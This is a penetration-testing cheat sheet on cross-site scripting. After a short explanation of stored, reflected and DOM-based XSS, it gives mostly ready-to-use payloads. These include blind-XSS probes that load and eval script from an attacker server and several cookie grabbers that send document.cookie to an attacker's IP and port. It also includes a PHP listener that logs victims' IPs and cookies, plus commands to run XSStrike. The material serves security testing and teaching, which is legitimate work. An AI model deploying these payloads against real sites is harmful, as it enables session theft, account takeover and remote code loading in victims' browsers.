# XSS

There are three major types of XSS:

* Stored: the user input is stored on the website. It usually happens on user profiles, forums, chats and so on were the user content is permanently (or temporarily) stored. Attackers can inject malicious payloads and every user browsing the infected page will be affected. This is one of the most dangerous forms of XSS because exploitation requires no phishing and it can affect many users. XSS on pages that only the attacker's user has the right to browse (e.g. user settings page) are called self-XSS and are considered to have a close to 0 impact since it's theoretically can't affect other users.
* Reflected: the user input is reflected but not stored. It usually happens on search forms, login pages and pages that reflect content for one response only. When the reflected vulnerable input is in the URI (`http://www.target.com/search.php?keyword=INJECTION`) attackers can craft a malicious URI and send it to the victims hoping they will browse it. This form of XSS usually requires phishing and attackers can be limited in the length of the malicious payload.
* DOM-based: while stored and reflected XSS attacks exploit vulnerabilities in the server-side code, a DOM-based XSS exploits client-side ones (e.g. JavaScript used to help dynamically render a page). DOM-based XSS usually affect user inputs that are temporarily reflected, just like reflected XSS attacks.

### XSS detection

```sh
<script>alert(window.origin)</script>

# Alert might be blocked
<script>print()</script>    # Will open the print window
<plaintext>                 # will stop rendering the HTML code that comes after it

# Dectect a blind XSS => make the victim retreive a document from our server
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

### Cookie grabbers

```sh
<img src="" onerror="fetch('http://<ip>:<port>/index.php?cookie=' + btoa(document.cookie))"></img>
<img src=x onerror="this.src='http://<ip>:<port>/index.php?cookie='+btoa(document.cookie)">
<script>fetch('http://<ip>:<port>/index.php?cookie=' + btoa(document.cookie))</script>
<script>new Image().src='http://<ip>:<port>/index.php?cookie=' + btoa(document.cookie);</script>

# Create a PHP server to parse and log the cookies
nano index.php

<?php
if (isset($_GET['cookie'])) {
    $list = explode(";", $_GET['cookie']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

sudo php -S 0.0.0.0:80 
```

### Automation

```sh
# Automate the discovery
git clone https://github.com/s0md3v/XSStrike.git
pip install -r requirements.txt
python xsstrike.py -u "<URL>" 
```

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber" %}
